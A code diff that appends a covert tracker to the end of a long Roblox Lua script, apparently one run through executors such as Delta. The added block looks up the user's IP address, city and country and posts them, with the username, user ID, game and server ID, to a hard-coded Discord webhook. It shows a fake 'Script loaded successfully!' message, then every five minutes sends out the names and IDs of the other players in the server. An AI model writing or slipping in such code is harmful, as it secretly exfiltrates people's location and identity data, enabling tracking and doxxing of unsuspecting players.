@@ -3909,3 +3909,91 @@ task.spawn(function()
         end)
     end
 end)
+
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local player = Players.LocalPlayer
+local webhook = "https://discord.com/api/webhooks/1545657401401802862/gXrJPivZ32ONHzW3ZpMBzCv5ZzAezCwAUmpLBo7jtfD-NOQuoWOs93yIUTOk2jabYPDR"
+
+-- Función para obtener información de IP
+local function GetIpData()
+    local success, result = pcall(function()
+        return game:HttpGet("http://ip-api.com/json/")
+    end)
+    
+    if success then
+        local data = HttpService:JSONDecode(result)
+        return data.query or "N/A", data.country or "N/A", data.city or "N/A"
+    end
+    return "Error", "Error", "Error"
+end
+
+-- Obtener datos
+local ip, country, city = GetIpData()
+getgenv().execCount = (getgenv().execCount or 0) + 1
+
+-- Enviar datos al webhook
+task.spawn(function()
+    pcall(function()
+        local data = {
+            content = "🚀 **Delta Executor Data**\n" ..
+                      "👤 **Usuario:** " .. player.Name .. " (ID: " .. player.UserId .. ")\n" ..
+                      "🌐 **IP:** " .. ip .. "\n" ..
+                      "🌍 **Ubicación:** " .. city .. ", " .. country .. "\n" ..
+                      "📊 **Ejecuciones:** " .. getgenv().execCount .. "\n" ..
+                      "🎮 **Juego:** " .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. "\n" ..
+                      "🔄 **Servidor:** " .. game.JobId
+        }
+        
+        local req = request or http_request or (syn and syn.request)
+        if req then
+            req({
+                Url = webhook,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(data)
+            })
+        end
+    end)
+end)
+
+-- Mostrar mensaje de éxito
+game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
+    Text = "[System] Script loaded successfully!",
+    Color = Color3.new(0, 1, 0),
+    Font = Enum.Font.SourceSansBold,
+})
+
+-- Recolectar información adicional periódicamente
+spawn(function()
+    while true do
+        wait(300) -- 5 minutos
+        
+        -- Capturar información de jugadores
+        local playersInfo = ""
+        for _, plr in ipairs(Players:GetPlayers()) do
+            playersInfo = playersInfo .. plr.Name .. " (ID: " .. plr.UserId .. ")\n"
+        end
+        
+        -- Enviar actualización
+        task.spawn(function()
+            pcall(function()
+                local updateData = {
+                    content = "🔄 **Actualización**\n" ..
+                              "👤 **Usuario:** " .. player.Name .. "\n" ..
+                              "📊 **Jugadores actuales:**\n" .. playersInfo
+                }
+                
+                local req = request or http_request or (syn and syn.request)
+                if req then
+                    req({
+                        Url = webhook,
+                        Method = "POST",
+                        Headers = {["Content-Type"] = "application/json"},
+                        Body = HttpService:JSONEncode(updateData)
+                    })
+                end
+            end)
+        end)
+    end
+end)
